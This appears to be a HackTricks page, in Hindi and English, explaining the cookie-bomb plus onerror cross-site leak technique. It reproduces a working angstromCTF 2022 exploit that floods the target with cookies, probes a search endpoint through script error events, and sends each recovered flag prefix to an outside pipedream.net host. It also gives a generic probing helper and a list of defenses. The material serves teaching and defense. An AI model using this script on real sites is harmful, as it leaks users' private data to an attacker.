# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

यह तकनीक संयोजित करती है:
- Cookie bombing: लक्ष्य origin के लिए पीड़ित के ब्राउज़र में कई/बड़ी cookies भरना ताकि बाद के अनुरोध सर्वर/अनुरोध सीमाओं (request header size, URL size in redirects, आदि) से टकराएँ।
- Error-event oracle: एक क्रॉस-ऑरिजिन endpoint को <script> (या अन्य subresource) के साथ probe करना और onload बनाम onerror से राज्यों को अलग करना।

मुख्य विचार
- एक target endpoint खोजें जिसका व्यवहार उन दो स्थितियों के लिए अलग हो जिन्हें आप परखना चाहते हैं (उदा., search “hit” vs “miss”)।
- सुनिश्चित करें कि “hit” path एक भारी redirect chain या लंबी URL ट्रिगर करेगा जबकि “miss” path छोटा रहेगा। कई cookies का उपयोग करके request headersinflate करें ताकि सिर्फ “hit” path ही सर्वर को HTTP error (उदा., 431/414/400) के साथ fail कराए। यह error onerror इवेंट को पलट देता है और XS-Search के लिए एक oracle बन जाता है।

यह कब काम करता है
- आप पीड़ित के ब्राउज़र को लक्ष्य पर cookies भेजने के लिए मजबूर कर सकते हैं (उदा., cookies are SameSite=None या आप उन्हें first-party context में popup window.open के माध्यम से सेट कर सकते हैं)।
- एक ऐप फ़ीचर मौजूद हो जिसे आप arbitrary cookies सेट करने के लिए abuso कर सकें (उदा., “save preference” endpoints जो controlled input names/values को Set-Cookie में बदल देते हैं) या post-auth redirects बनाने के लिए जो attacker-controlled डेटा को URL में शामिल करते हैं।
- सर्वर दोनों राज्यों पर अलग प्रतिक्रिया देता है और inflated headers/URL के साथ, एक राज्य किसी सीमा को पार कर जाता है और एक error response लौटाता है जो onerror को ट्रिगर करता है।

Oracle के रूप में उपयोग की जाने वाली सर्वर त्रुटियों पर नोट
- 431 Request Header Fields Too Large आमतौर पर तब लौटता है जब cookies request headers को inflate करती हैं; 414 URI Too Long या लंबे request targets के लिए कोई server-specific 400 लौट सकता है। इनमें से कोई भी failed subresource load में बदलकर onerror फायर कर देता है। [MDN documents 431 and typical causes like excessive cookies.]()

व्यावहारिक उदाहरण (angstromCTF 2022)
निम्नलिखित script (एक public writeup से) उस फ़ीचर का दुरुपयोग करता है जो attacker को arbitrary cookies डालने देता है, और फिर एक cross-origin search endpoint को एक script के रूप में लोड करता है। जब query सही होती है, सर्वर एक redirect करता है जो cookie bloat के साथ मिलकर server limits को पार कर देता है और एक error status लौटाता है, इसलिए script.onerror फायर होता है; अन्यथा कुछ भी नहीं होता।
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
Popup (window.open) क्यों?
- आधुनिक ब्राउज़र third-party cookies को तेजी से ब्लॉक कर रहे हैं। लक्ष्य पर एक top-level window खोलने से cookies first‑party बन जाती हैं, इसलिए लक्ष्य से आने वाली Set-Cookie responses टिक जाती हैं, और cookie-bomb step संभव हो जाता है भले ही third‑party cookie restrictions हों।

Generic probing सहायक
If you already have a way to set many cookies on the target origin (first-party), you can reuse this minimal oracle against any endpoint whose success/failure leads to different network outcomes (status/MIME/redirect):
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
Tips to build the oracle
- Force the “positive” state to be heavier: शर्त सही होने पर ही एक अतिरिक्त redirect जोड़ें, या redirect URL को अनबाउंडेड user input दिखाने वाला रखें ताकि यह guessed prefix के साथ बढ़े।
- Inflate headers: cookie bombing को रिपीट करें जब तक “heavy” path पर लगातार कोई error न दिखे। सर्वर आम तौर पर header size को cap करते हैं और कई cookies होने पर जल्दी fail कर जाते हैं।
- Stabilize: कई parallel cookie set operations चलाएँ और बार-बार probe करें ताकि timing और caching noise का औसत निकले।

Related XS-Search tricks
- URL length based oracles (no cookies needed) को combine किया जा सकता है या तब इस्तेमाल करें जब आप किसी बहुत लंबे request target को मजबूर कर सकें:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Defenses and hardening
- Make success/failure responses indistinguishable:
- conditional redirects या अलग-अलग response size वाले बड़े अंतर से बचें। हर state के लिए वही status, वही Content-Type और समान body length लौटाएँ।
- Block cross-site subresource probes:
- SameSite cookies: संवेदनशील cookies को SameSite=Lax या Strict पर सेट करें ताकि subresource requests जैसे <script src> उन्हें भेजें ही नहीं; auth tokens के लिए संभव हो तो Strict पसंद करें।
- Fetch Metadata: Resource Isolation Policy लागू करें ताकि cross-site subresource लोड रिजेक्ट हो (उदाहरण के लिए, अगर Sec-Fetch-Site != same-origin/same-site)।
- Cross-Origin-Resource-Policy (CORP): उन endpoints के लिए CORP: same-origin (या कम से कम same-site) सेट करें जिन्हें cross-origin subresources के रूप में embed नहीं किया जाना चाहिए।
- X-Content-Type-Options: nosniff और JSON/HTML endpoints पर सही Content-Type सेट करें ताकि load-as-script quirks न हों।
- Reduce header/URL amplification:
- Set किए जाने वाले cookies की संख्या/साइज़ को सीमित करें; उन फीचर्स को sanitize करें जो arbitrary form fields को Set-Cookie में बदल देते हैं।
- redirects में reflected data को normalize या truncate करें; Location URLs में attacker-controlled लंबे स्ट्रिंग्स embed करने से बचें।
- सर्वर limits को consistent रखें और uniformly fail कराएँ (किसी एक शाखा के लिए अलग error pages से बचें)।

Notes
- इस क्लास की attacks को व्यापक रूप से “Error Events” XS-Leaks के रूप में चर्चा किया जाता है। cookie-bomb step सिर्फ एक सुविधाजनक तरीका है ताकि केवल एक शाखा सर्वर limits पार करे और एक विश्वसनीय boolean oracle पैदा हो।

## References
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (common with many cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
{{#include ../../banners/hacktricks-training.md}}
